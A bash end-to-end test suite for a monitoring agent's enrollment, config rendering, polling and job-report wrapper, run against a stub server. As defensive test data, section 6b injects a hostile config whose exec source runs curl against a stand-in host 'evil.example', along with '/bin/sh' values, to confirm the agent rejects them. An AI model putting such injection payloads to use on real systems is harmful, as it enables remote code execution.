#!/usr/bin/env bash
# End-to-end tests for the agent payload (ctl, renderer, config poller, job
# reporter) against a stub facade: no systemd, no network, no root —
# everything is redirected via the CV_AGENT_* test overrides. Portable
# across GNU and BSD userlands (runs on Linux CI and macOS dev machines).
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CTL="$REPO_DIR/agent/bin/cloudviewer-agent"
POLLER="$REPO_DIR/agent/libexec/fetch-config"
RENDERER="$REPO_DIR/agent/libexec/render-config"
WRAPPER="$REPO_DIR/agent/bin/cloudviewer-report"
GOLDEN_DIR="$REPO_DIR/tests/golden"
TMP="$(mktemp -d)"
SERVER_PID=""
trap '[ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null; rm -rf "$TMP"' EXIT

PASS=0
fail() {
    echo "FAIL: $*" >&2
    exit 1
}
ok() {
    PASS=$((PASS + 1))
    echo "ok: $*"
}

# GNU stat vs BSD stat — the only portability seam the assertions need.
file_mode() { stat -c %a "$1" 2>/dev/null || stat -f %Lp "$1"; }
file_mtime() { stat -c %Y "$1" 2>/dev/null || stat -f %m "$1"; }

# The facade's manifest for a tier, byte-identical to renderAgentManifest
# in the facade (pinned there by TestAgentConfigManifestTiers).
write_manifest() {
    case "$1" in
    free) printf 'manifest_version=1\ntier=free\nships_journald=false\nships_auth_logs=false\n' ;;
    pro) printf 'manifest_version=1\ntier=pro\nships_journald=true\nships_auth_logs=false\n' ;;
    team) printf 'manifest_version=1\ntier=team\nships_journald=true\nships_auth_logs=true\n' ;;
    *) fail "unknown tier $1" ;;
    esac
}

# ---- 0. renderer golden fixtures --------------------------------------------
# The rendered vector.yaml IS the product; pin it per tier so any template
# change is a deliberate, reviewed diff. The redaction VRL inside these
# fixtures is additionally pinned from the facade side
# (TestRedactVRLParity) — the two repos cannot drift without one CI failing.

for tier in free pro team; do
    write_manifest "$tier" >"$TMP/manifest.$tier"
    env CV_AGENT_TOKEN=golden-token CV_AGENT_FACADE_URL=https://api.example.test \
        sh "$RENDERER" "$TMP/manifest.$tier" >"$TMP/rendered.$tier" ||
        fail "renderer failed for $tier"
    diff -u "$GOLDEN_DIR/$tier.yaml" "$TMP/rendered.$tier" ||
        fail "rendered $tier config drifted from tests/golden/$tier.yaml (review the diff; update the golden only deliberately)"
done
grep -q "auth_logs" "$TMP/rendered.pro" && fail "pro must not render auth logs"
grep -q "journald" "$TMP/rendered.free" && fail "free must not render a log pipeline"
grep -q "golden-token" "$TMP/rendered.free" || fail "token must be injected locally into the sink headers"
ok "renderer → golden fixtures match for free/pro/team"

# ---- 0b. disk health in the renderer (specs/44 §3.2) ------------------------
# manifest_version 2 adds exactly one bool, ships_disk_health. With it false
# the render is byte-identical to version 1; with it true it adds one exec
# source whose command is a literal of render-config's own template — and
# only when the reader helper is installed.

render() { # render <libexec-dir> <manifest-file>
    env CV_AGENT_TOKEN=golden-token CV_AGENT_FACADE_URL=https://api.example.test \
        CV_AGENT_LIBEXEC_DIR="$1" sh "$RENDERER" "$2"
}
write_manifest_v2() { # write_manifest_v2 <tier> <ships_disk_health value>
    write_manifest "$1" | sed 's/^manifest_version=1$/manifest_version=2/'
    printf 'ships_disk_health=%s\n' "$2"
}
LIBEXEC_WITH_READER="$REPO_DIR/agent/libexec"
[ -x "$LIBEXEC_WITH_READER/disk-health-read" ] || fail "agent/libexec/disk-health-read must be executable"
mkdir -p "$TMP/libexec-without-reader"

for tier in free pro team; do
    write_manifest_v2 "$tier" false >"$TMP/manifest.v2.$tier.off"
    render "$LIBEXEC_WITH_READER" "$TMP/manifest.v2.$tier.off" >"$TMP/rendered.v2.$tier.off" ||
        fail "renderer failed for v2 $tier off"
    diff -u "$GOLDEN_DIR/$tier.yaml" "$TMP/rendered.v2.$tier.off" ||
        fail "v2 with ships_disk_health=false must render exactly like v1 ($tier)"
    write_manifest_v2 "$tier" true >"$TMP/manifest.v2.$tier.on"
    render "$LIBEXEC_WITH_READER" "$TMP/manifest.v2.$tier.on" >"$TMP/rendered.v2.$tier.on" ||
        fail "renderer failed for v2 $tier on"
done
for tier in free pro; do
    diff -u "$GOLDEN_DIR/$tier-disk-health.yaml" "$TMP/rendered.v2.$tier.on" ||
        fail "rendered $tier+disk-health config drifted from tests/golden/$tier-disk-health.yaml"
done
ok "renderer → manifest v2: disk health off = v1 goldens, on = disk-health goldens"

# Key true, helper absent (e.g. the container image, or a package older
# than the facade): no exec source at all — byte-identical to the off render.
for tier in free pro team; do
    render "$TMP/libexec-without-reader" "$TMP/manifest.v2.$tier.on" >"$TMP/rendered.v2.$tier.noreader" ||
        fail "renderer failed for v2 $tier without the reader"
    diff -u "$GOLDEN_DIR/$tier.yaml" "$TMP/rendered.v2.$tier.noreader" ||
        fail "ships_disk_health=true without the reader must render no disk-health pipeline ($tier)"
    grep -q "type: exec" "$TMP/rendered.v2.$tier.noreader" && fail "exec source rendered without the reader ($tier)"
done
ok "renderer → ships_disk_health=true but reader absent → no exec source"

# Across every manifest the fixtures cover, the only exec source anywhere
# is disk_health, and its command line is byte-equal to the template's one
# literal command line (no manifest string can reach it).
template_cmd="$(grep -E '^ +command: ' "$RENDERER")"
[ "$(printf '%s\n' "$template_cmd" | wc -l | tr -d ' ')" = 1 ] ||
    fail "render-config must contain exactly one command: literal"
[ "$template_cmd" = '    command: ["/usr/libexec/cloudviewer-agent/disk-health-read"]' ] ||
    fail "the template's command literal changed: $template_cmd"
exec_renders=0
for f in "$TMP"/rendered.*; do
    n_exec="$(grep -c '^    type: exec$' "$f" || true)"
    if [ "$n_exec" = 0 ]; then
        grep -q 'command:' "$f" && fail "$(basename "$f"): command without an exec source"
        continue
    fi
    [ "$n_exec" = 1 ] || fail "$(basename "$f"): more than one exec source"
    exec_renders=$((exec_renders + 1))
    [ "$(grep -E '^ +command: ' "$f")" = "$template_cmd" ] ||
        fail "$(basename "$f"): rendered command differs from the template literal"
    grep -qx '      exec_interval_secs: 300' "$f" || fail "$(basename "$f"): interval must be the template's 300 s"
    grep -qx '    mode: scheduled' "$f" || fail "$(basename "$f"): exec source must be scheduled"
done
[ "$exec_renders" = 3 ] || fail "expected 3 renders with the exec source, got $exec_renders"
ok "renderer → exec command byte-equal to the template literal in every render ($exec_renders with disk health)"

# ---- fixture: stub facade ---------------------------------------------------

write_manifest pro >"$TMP/config.yaml"
mkdir -p "$TMP/downloads"
python3 "$REPO_DIR/tests/stub_server.py" "$TMP/downloads" "$TMP/config.yaml" "$TMP/port" &
SERVER_PID=$!
for _ in $(seq 1 50); do
    [ -s "$TMP/port" ] && break
    sleep 0.1
done
[ -s "$TMP/port" ] || fail "stub server did not start"
PORT="$(cat "$TMP/port")"
FACADE="http://127.0.0.1:$PORT"

# systemctl stub records its invocations
mkdir -p "$TMP/bin"
cat >"$TMP/bin/systemctl" <<EOF
#!/bin/sh
echo "\$@" >>"$TMP/systemctl.log"
EOF
chmod +x "$TMP/bin/systemctl"

ETC="$TMP/etc"
DATA="$TMP/data"
LIBEXEC="$REPO_DIR/agent/libexec"
run_ctl() {
    env CV_AGENT_ETC_DIR="$ETC" \
        CV_AGENT_DATA_DIR="$DATA" \
        CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
        CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
        sh "$CTL" "$@"
}
run_poller() {
    env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_LIBEXEC_DIR="$LIBEXEC" sh "$POLLER"
}
# run_ctl with the metadata service pointed at $1 (the fleet-enrollment
# identity source; on a real host it is the link-local 169.254.169.254).
run_ctl_fleet() {
    meta="$1"
    shift
    env CV_AGENT_ETC_DIR="$ETC" \
        CV_AGENT_DATA_DIR="$DATA" \
        CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
        CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
        CV_AGENT_METADATA_URL="$meta" \
        sh "$CTL" "$@"
}
META="$FACADE/metadata/instance-id"

# ---- 1. enroll: unknown token fails fast, writes nothing --------------------

set +e
out="$(run_ctl enroll --token nope --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll with unknown token should fail"
echo "$out" | grep -q "rejected the agent token" || fail "unexpected unknown-token message: $out"
[ ! -e "$ETC" ] || fail "unknown token must not write anything"
ok "enroll unknown token → clear error, nothing written"

# ---- 2. enroll: revoked token gets its own message --------------------------

set +e
out="$(run_ctl enroll --token revoked-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll with revoked token should fail"
echo "$out" | grep -q "revoked" || fail "unexpected revoked-token message: $out"
ok "enroll revoked token → clear error"

# ---- 3. enroll: happy path (manifest fetched, config rendered locally) ------

run_ctl enroll --token good-token --facade-url "$FACADE" >"$TMP/enroll.out"

[ "$(file_mode "$ETC/agent.env")" = "600" ] || fail "agent.env must be 0600"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "vector.yaml must be 0640 (group-readable for the vector user)"
[ "$(file_mode "$ETC/manifest")" = "644" ] || fail "manifest must be cached 0644"
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "token missing from agent.env"
cmp -s "$ETC/manifest" "$TMP/config.yaml" || fail "cached manifest must match the facade's"
# The rendered config: local identity injected, tier gates honored.
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "rendered config missing host_metrics"
grep -q "uri: $FACADE/v1/ingest/metrics" "$ETC/vector.yaml" || fail "sink must point at the enrolling facade"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "token must be injected into sink headers"
grep -q "data_dir: $DATA" "$ETC/vector.yaml" || fail "rendered config must pin our data_dir"
grep -q "redact_journald" "$ETC/vector.yaml" || fail "pro tier must render the journald redaction"
grep -q "auth_logs" "$ETC/vector.yaml" && fail "pro tier must not render auth logs"
[ ! -e "$ETC/config.etag" ] || fail "enroll must clear the etag (first poll re-establishes it)"
grep -q "^enable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "units not enabled"
grep -q "Connected in the portal" "$TMP/enroll.out" || fail "missing success banner"
ok "enroll → manifest cached, config rendered locally, token injected, units enabled"

# ---- 4. enroll is idempotent and rotates tokens in place --------------------

run_ctl enroll --token rotated-token --facade-url "$FACADE" --quiet >"$TMP/rotate.out"
grep -q "CV_AGENT_TOKEN=rotated-token" "$ETC/agent.env" || fail "re-enroll must replace the token"
grep -q "X-Agent-Token: rotated-token" "$ETC/vector.yaml" || fail "re-enroll must re-render with the new token"
[ ! -s "$TMP/rotate.out" ] || fail "--quiet must suppress the banner"
ok "re-enroll → token rotated in place (agent.env + rendered config), --quiet silent"

# ---- 5. enroll: pre-provisioned agent.env (the declarative path) ------------

rm -rf "$ETC"
mkdir -p "$ETC"
printf 'CV_AGENT_TOKEN=good-token\nCV_AGENT_FACADE_URL=%s\n' "$FACADE" >"$ETC/agent.env"
chmod 600 "$ETC/agent.env"
run_ctl enroll --quiet
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "pre-provisioned enroll must render the config"
ok "enroll with pre-provisioned agent.env → completes without flags"

# no token anywhere → actionable error
rm -rf "$ETC"
set +e
out="$(run_ctl enroll 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll without any token should fail"
echo "$out" | grep -q "pre-provision" || fail "missing pre-provision hint: $out"
ok "enroll without token → actionable error"

# ---- 5b. fleet enrollment: happy path (specs/12 §3) -------------------------
# The stub's metadata endpoint answers 4242, which the enroll token's
# project inventory contains → the facade mints per-server "good-token".

: >"$TMP/systemctl.log"
run_ctl_fleet "$META" enroll --enroll-token good-enroll-token --facade-url "$FACADE" >"$TMP/fleet.out"
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "fleet enroll must store the minted per-server token"
# The enrollment token enrolls, it never ingests — and it must never be
# persisted anywhere on the host (specs/12 §9).
grep -rq "good-enroll-token" "$ETC" && fail "the enrollment token must never be written to disk"
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "fleet enroll must render vector.yaml"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "rendered config must carry the minted token"
grep -q "^enable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "fleet enroll must enable the units"
grep -q "Connected in the portal" "$TMP/fleet.out" || fail "fleet enroll missing success banner"
ok "fleet enroll → minted token stored, enroll token never persisted, config rendered, units enabled"

# ---- 5c. fleet enrollment is a network-free no-op once enrolled -------------
# The converge contract (specs/12 §5): both the metadata URL and the
# facade URL point at a dead port here, so success is only possible if the
# re-run makes no network call at all.

cp "$ETC/agent.env" "$TMP/agent.env.before"
out="$(run_ctl_fleet "http://127.0.0.1:1/instance-id" enroll \
    --enroll-token good-enroll-token --facade-url "http://127.0.0.1:1")"
echo "$out" | grep -q "already enrolled — nothing to do" || fail "re-run must say it is a no-op: $out"
cmp -s "$ETC/agent.env" "$TMP/agent.env.before" || fail "idempotent re-run must not touch agent.env"
ok "fleet enroll re-run → network-free no-op (dead metadata + facade prove it), agent.env untouched"

# ---- 5d. fleet enrollment without a metadata service ------------------------
# Dedicated (Robot) servers have no metadata service — the error must say
# so and point at the per-server path, and nothing may be written.

rm -rf "$ETC"
set +e
out="$(run_ctl_fleet "http://127.0.0.1:1/instance-id" enroll \
    --enroll-token good-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "fleet enroll without metadata service should fail"
echo "$out" | grep -q "dedicated (Robot) servers" || fail "missing dedicated-server hint: $out"
[ ! -e "$ETC" ] || fail "metadata failure must not write anything"
ok "fleet enroll unreachable metadata → dedicated-server hint, nothing written"

# ---- 5e. fleet enrollment of a foreign instance (cross-tenant) --------------
# Instance 6666 exists, but not in the enroll token's project inventory:
# the facade answers 404 (specs/12 §2 — never trust a self-asserted id),
# which must map to the project hint, not a bare HTTP code.

set +e
out="$(run_ctl_fleet "$FACADE/metadata/instance-id-foreign" enroll \
    --enroll-token good-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "fleet enroll of a foreign instance should fail"
echo "$out" | grep -q "instance 6666" || fail "error must name the claimed instance: $out"
echo "$out" | grep -q "not in the token's project inventory" || fail "missing project hint: $out"
[ ! -e "$ETC" ] || fail "cross-tenant rejection must not write anything"
ok "fleet enroll cross-tenant instance → project-inventory hint, nothing written"

# ---- 5f. revoked fleet enrollment token -------------------------------------

set +e
out="$(run_ctl_fleet "$META" enroll --enroll-token revoked-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "revoked enroll token should fail"
echo "$out" | grep -q "revoked or server limit reached" || fail "unexpected revoked-enroll message: $out"
echo "$out" | grep -q "enrollment token revoked" || fail "facade's own wording must be passed through: $out"
[ ! -e "$ETC" ] || fail "revoked enroll token must not write anything"
ok "fleet enroll revoked token → clear error with the facade's wording, nothing written"

# ---- 5g. pre-provisioned CV_AGENT_ENROLL_TOKEN (specs/30 §8.2) --------------
# The declarative fleet shape: cloud-init/config management drops an
# agent.env carrying only the enrollment token, then runs bare `enroll`.
# The final agent.env holds only the minted per-server identity.

mkdir -p "$ETC"
printf 'CV_AGENT_ENROLL_TOKEN=good-enroll-token\nCV_AGENT_FACADE_URL=%s\n' "$FACADE" >"$ETC/agent.env"
chmod 600 "$ETC/agent.env"
run_ctl_fleet "$META" enroll --quiet
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "pre-provisioned fleet enroll must store the minted token"
grep -q "CV_AGENT_ENROLL_TOKEN" "$ETC/agent.env" && fail "the enrollment token must not survive enrollment"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "pre-provisioned fleet enroll must render the config"
ok "pre-provisioned CV_AGENT_ENROLL_TOKEN + bare enroll → fleet path, minted token only"

# ---- 5h. fleet-enroll helper: the entrypoint's stdout contract --------------
# The container entrypoint consumes the shared helper directly (no ctl in
# the image): the minted token must be EXACTLY the stdout, errors must
# stay on stderr, so a captured "$(fleet-enroll)" is usable verbatim.

minted="$(env CV_AGENT_ENROLL_TOKEN=good-enroll-token CV_AGENT_FACADE_URL="$FACADE" \
    CV_AGENT_METADATA_URL="$META" sh "$REPO_DIR/agent/libexec/fleet-enroll" 2>"$TMP/fleet-helper.err")" ||
    fail "fleet-enroll helper must succeed against the stub"
[ "$minted" = "good-token" ] || fail "helper stdout must be exactly the minted token, got: $minted"
[ ! -s "$TMP/fleet-helper.err" ] || fail "helper success must write nothing to stderr"
ok "fleet-enroll helper → minted token on stdout, silent stderr (entrypoint contract)"

# ---- 6. config poller: 200 → 304 → tier change → re-render ------------------

run_ctl enroll --token good-token --facade-url "$FACADE" --quiet

run_poller
[ -s "$ETC/config.etag" ] || fail "first poll should store the ETag"

# Pin the mtime to a fixed past date: a 304 must not rewrite the file, so
# the mtime has to survive the second poll (portable across stat variants).
touch -t 200001010000 "$ETC/vector.yaml"
run_poller
[ "$(file_mtime "$ETC/vector.yaml")" -lt 1000000000 ] ||
    fail "unchanged manifest must 304 and not rewrite vector.yaml"

# Tier upgrade pro → team: the new manifest re-renders with the auth-log
# pipeline, within one poll.
write_manifest team >"$TMP/config.yaml"
run_poller
grep -q "auth_logs" "$ETC/vector.yaml" || fail "team manifest must render the auth-log pipeline"
grep -q "inputs: \[redact_journald, redact_auth\]" "$ETC/vector.yaml" ||
    fail "team log sink must consume both redaction transforms"
cmp -s "$ETC/manifest" "$TMP/config.yaml" || fail "cached manifest must follow the facade"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "refreshed vector.yaml must stay 0640"
ok "config poller → ETag stored, 304 no-op, tier change re-renders within one poll"

# revoked mid-flight: poller keeps the last config and fails visibly
sed "s/CV_AGENT_TOKEN=.*/CV_AGENT_TOKEN=revoked-token/" "$ETC/agent.env" >"$ETC/agent.env.tmp"
mv "$ETC/agent.env.tmp" "$ETC/agent.env"
set +e
out="$(run_poller 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "poller must exit non-zero on a revoked token"
echo "$out" | grep -q "keeping current config" || fail "poller must say it kept the config"
grep -q "auth_logs" "$ETC/vector.yaml" || fail "revoked token must not clobber the config"
sed "s/CV_AGENT_TOKEN=.*/CV_AGENT_TOKEN=good-token/" "$ETC/agent.env" >"$ETC/agent.env.tmp"
mv "$ETC/agent.env.tmp" "$ETC/agent.env"
ok "config poller with revoked token → last config kept, visible failure"

# ---- 6b. manifest schema is the trust boundary ------------------------------
# A compromised facade is the threat model. Whatever it serves — extra
# keys, unknown versions, or a full vector.yaml with an exec source (the
# pre-manifest attack) — nothing outside the strict schema ever reaches
# vector.yaml: reject, keep the last config, fail visibly.

expect_rejected() {
    reason="$1"
    set +e
    out="$(run_poller 2>&1)"
    rc=$?
    set -e
    [ "$rc" -ne 0 ] || fail "poller must reject: $reason"
    echo "$out" | grep -q "manifest rejected" || fail "missing rejection message for $reason: $out"
    grep -q "auth_logs" "$ETC/vector.yaml" || fail "$reason must not clobber the good config"
    [ ! -f "$ETC/.vector.yaml.tmp" ] || fail "rejected render must not linger on disk"
}

{ write_manifest team; printf 'exec_me=please\n'; } >"$TMP/config.yaml"
expect_rejected "unknown key"
printf 'manifest_version=9\ntier=team\nships_journald=true\nships_auth_logs=true\n' >"$TMP/config.yaml"
expect_rejected "unknown manifest_version"
printf 'sources:\n  pwn:\n    type: exec\n    command: ["curl", "evil.example"]\n' >"$TMP/config.yaml"
expect_rejected "full-config injection (exec source)"

# Same boundary at enrollment: a hostile first manifest refuses to enroll.
rm -rf "$TMP/etc-hostile"
set +e
out="$(env CV_AGENT_ETC_DIR="$TMP/etc-hostile" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
    CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
    sh "$CTL" enroll --token good-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll must refuse a hostile manifest"
echo "$out" | grep -q "refusing to enroll" || fail "enroll must explain the refusal: $out"
[ ! -f "$TMP/etc-hostile/vector.yaml" ] || fail "hostile manifest must not produce a config at enroll"

# ships_disk_health is a bool (specs/44 §3.2/§9): a string, a number or an
# object is a schema violation like any other — rejected, last config kept.
for bad in '"true"' 'yes' 'TRUE' '1' '0' '{"enabled":true}' '["/bin/sh"]' '' 'true ' \
    '/usr/libexec/cloudviewer-agent/disk-health-read'; do
    { write_manifest team | sed 's/^manifest_version=1$/manifest_version=2/'; printf 'ships_disk_health=%s\n' "$bad"; } >"$TMP/config.yaml"
    expect_rejected "ships_disk_health=$bad"
done
# Required in v2, unknown in v1, and never twice.
write_manifest team | sed 's/^manifest_version=1$/manifest_version=2/' >"$TMP/config.yaml"
expect_rejected "manifest_version 2 without ships_disk_health"
{ write_manifest team; printf 'ships_disk_health=true\n'; } >"$TMP/config.yaml"
expect_rejected "ships_disk_health in a version-1 manifest"
{ write_manifest team | sed 's/^manifest_version=1$/manifest_version=2/'; printf 'ships_disk_health=false\nships_disk_health=true\n'; } >"$TMP/config.yaml"
expect_rejected "duplicate ships_disk_health"
grep -q "type: exec" "$ETC/vector.yaml" && fail "a rejected disk-health manifest must not have rendered anything"

# The facade's whole lever, both directions: true adds the reader's exec
# source to the metrics pipeline within one poll, false removes it again.
{ write_manifest team | sed 's/^manifest_version=1$/manifest_version=2/'; printf 'ships_disk_health=true\n'; } >"$TMP/config.yaml"
run_poller
grep -qx '    type: exec' "$ETC/vector.yaml" || fail "ships_disk_health=true must render the exec source"
grep -qx '    inputs: \[host_metrics, disk_health_metrics\]' "$ETC/vector.yaml" ||
    fail "disk-health gauges must feed the metrics sink"
{ write_manifest team | sed 's/^manifest_version=1$/manifest_version=2/'; printf 'ships_disk_health=false\n'; } >"$TMP/config.yaml"
run_poller
grep -q "disk_health" "$ETC/vector.yaml" && fail "ships_disk_health=false must remove the disk-health pipeline"

write_manifest team >"$TMP/config.yaml"
ok "manifest schema → unknown keys/versions, config injection, non-bool ships_disk_health rejected; disk health toggles within one poll"

# ---- 6c. render: package upgrade re-applies the template offline ------------

printf '# stale render from an older package\n' >"$ETC/vector.yaml"
run_ctl render
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "render must rebuild vector.yaml from the cached manifest"
grep -q "auth_logs" "$ETC/vector.yaml" || fail "render must honor the cached team manifest"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "render must keep 0640"
# Not enrolled under the manifest model → silent no-op (postinstall safety).
rm -rf "$TMP/etc-empty2" && mkdir -p "$TMP/etc-empty2"
env CV_AGENT_ETC_DIR="$TMP/etc-empty2" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
    CV_AGENT_LIBEXEC_DIR="$LIBEXEC" sh "$CTL" render || fail "render without a manifest must no-op"
ok "render → offline re-render from cached manifest, no-op when unenrolled"

# ---- 7. status --------------------------------------------------------------

out="$(run_ctl status)"
echo "$out" | grep -q "^enrolled$" || fail "status must report enrolled"
echo "$out" | grep -q "facade:   $FACADE" || fail "status must show the facade URL"

rm -rf "$TMP/etc-empty"
set +e
out="$(env CV_AGENT_ETC_DIR="$TMP/etc-empty" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" sh "$CTL" status)"
rc=$?
set -e
[ "$rc" = "3" ] || fail "status when unenrolled must exit 3, got $rc"
echo "$out" | grep -q "not enrolled" || fail "status must say not enrolled"
ok "status → enrolled details / not-enrolled exit 3"

# ---- 8. cloudviewer-report wrapper ------------------------------------------

env CV_AGENT_ETC_DIR="$ETC" sh "$WRAPPER" --job backup-s3 --max-age 26h -- true ||
    fail "wrapper must propagate the wrapped command's exit 0"
grep -q '"job_name":"backup-s3"' "$TMP/job-reports.log" || fail "wrapper did not report the job"
grep -q '"exit_code":0' "$TMP/job-reports.log" || fail "wrapper reported wrong exit code"
grep -q '"max_age_seconds":93600' "$TMP/job-reports.log" || fail "wrapper did not convert 26h to 93600s"

set +e
env CV_AGENT_ETC_DIR="$ETC" sh "$WRAPPER" --job flaky -- sh -c 'exit 3'
wrapper_ec=$?
set -e
[ "$wrapper_ec" = "3" ] || fail "wrapper must propagate exit 3, got $wrapper_ec"
grep -q '"job_name":"flaky","exit_code":3' "$TMP/job-reports.log" || fail "failure not reported"

# An unreachable facade must never fail the wrapped job.
set +e
env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_TOKEN=good-token CV_AGENT_FACADE_URL=http://127.0.0.1:1 \
    sh "$WRAPPER" --job offline -- true
wrapper_ec=$?
set -e
[ "$wrapper_ec" = "0" ] || fail "unreachable facade must not fail the job, got $wrapper_ec"

# Token problems must NEVER kill the wrapped job — the job runs first,
# token resolution is best-effort afterwards.
BROKEN_ETC="$TMP/broken-etc"
mkdir -p "$BROKEN_ETC"
printf '# no keys here\n' >"$BROKEN_ETC/agent.env"
set +e
out="$(env CV_AGENT_ETC_DIR="$BROKEN_ETC" sh "$WRAPPER" --job orphan -- sh -c 'echo JOB_RAN; exit 4' 2>&1)"
wrapper_ec=$?
set -e
echo "$out" | grep -q JOB_RAN || fail "broken agent.env: the job must still run"
[ "$wrapper_ec" = "4" ] || fail "broken agent.env: want job's exit 4, got $wrapper_ec"
echo "$out" | grep -q "job ran, not reported" || fail "broken agent.env: must say it could not report"
chmod 000 "$BROKEN_ETC/agent.env"
set +e
out="$(env CV_AGENT_ETC_DIR="$BROKEN_ETC" sh "$WRAPPER" --job orphan -- sh -c 'echo JOB_RAN; exit 0' 2>&1)"
wrapper_ec=$?
set -e
chmod 600 "$BROKEN_ETC/agent.env"
echo "$out" | grep -q JOB_RAN || fail "unreadable agent.env: the job must still run"
[ "$wrapper_ec" = "0" ] || fail "unreadable agent.env: want job's exit 0, got $wrapper_ec"
ok "cloudviewer-report → reports, propagates exit codes, never kills the job"

# ---- 8b. disk health: the operator's local switch (specs/44 §3.1) ----------

mkdir -p "$TMP/smartbin" "$TMP/emptybin"
cat >"$TMP/smartbin/smartctl" <<EOF
#!/bin/sh
echo "\$*" >>"$TMP/smartctl.log"
case "\$*" in
"--scan -j")
    printf '{\n  "json_format_version": [\n    1,\n    0\n  ],\n  "devices": [\n'
    for d in /dev/nvme0 /dev/sda1 /dev/bus/0 /dev/sdb /dev/nvme0n1 /dev/nvme0; do
        printf '    {\n      "name": "%s",\n      "info_name": "%s",\n      "type": "x"\n    },\n' "\$d" "\$d"
    done
    printf '  ]\n}\n'
    ;;
*" /dev/nvme0") printf '{"smartctl":{"exit_status":8},"device":{"name":"/dev/nvme0"}}' ; exit 8 ;;
*" /dev/sdb") printf '{"smartctl":{"exit_status":2},"device":{"name":"/dev/sdb"}}\n' ; exit 2 ;;
*) echo "unexpected smartctl argv: \$*" >&2; exit 64 ;;
esac
EOF
chmod +x "$TMP/smartbin/smartctl"

: >"$TMP/systemctl.log"
out="$(env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" PATH="$TMP/smartbin:$PATH" \
    sh "$CTL" enable disk-health)"
grep -qx "enable --now cloudviewer-disk-health.timer" "$TMP/systemctl.log" || fail "enable disk-health must enable the timer"
echo "$out" | grep -q "disable disk-health" || fail "enable must say how to switch it off again: $out"
: >"$TMP/systemctl.log"
env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" sh "$CTL" disable disk-health >/dev/null
grep -qx "disable --now cloudviewer-disk-health.timer" "$TMP/systemctl.log" || fail "disable disk-health must disable the timer"

# No smartctl → refuse with the package hint, touch no unit. (PATH holds no
# smartctl at all; the ctl needs no external command on this path.)
: >"$TMP/systemctl.log"
set +e
out="$(env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" PATH="$TMP/emptybin" \
    /bin/sh "$CTL" enable disk-health 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enable disk-health without smartctl must fail"
echo "$out" | grep -q "install smartmontools" || fail "missing smartmontools hint: $out"
[ ! -s "$TMP/systemctl.log" ] || fail "enable without smartctl must not touch any unit"
set +e
env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" sh "$CTL" enable something-else >/dev/null 2>&1
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enable accepts only disk-health"
[ ! -s "$TMP/systemctl.log" ] || fail "an unknown feature must not touch any unit"
ok "enable/disable disk-health → timer switched locally; refused without smartctl"

# Bootstrap --with-disk-health (dnf path: no network in the bootstrap's rpm
# repo setup, so the stubbed package manager is all it touches).
cat >"$TMP/bin/pkg" <<EOF
#!/bin/sh
echo "pkg \$*" >>"$TMP/bootstrap.log"
EOF
cat >"$TMP/bin/enroll-bin" <<EOF
#!/bin/sh
echo "ctl \$*" >>"$TMP/bootstrap.log"
EOF
chmod +x "$TMP/bin/pkg" "$TMP/bin/enroll-bin"
run_bootstrap() {
    rm -rf "${TMP:?}/root" "${TMP:?}/bootstrap.log"
    env CV_AGENT_ROOT="$TMP/root" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" CV_AGENT_PKG="$TMP/bin/pkg" \
        CV_AGENT_PKG_KIND=dnf CV_AGENT_ENROLL_BIN="$TMP/bin/enroll-bin" \
        sh "$REPO_DIR/install.sh" "$@" >/dev/null
}
run_bootstrap --token good-token --with-disk-health
printf '%s\n' "pkg dnf install -y cloudviewer-agent smartmontools" "ctl enroll --token good-token" \
    "ctl enable disk-health" | diff -u - "$TMP/bootstrap.log" ||
    fail "--with-disk-health must install smartmontools and enable disk health after enrolling"
run_bootstrap --token good-token
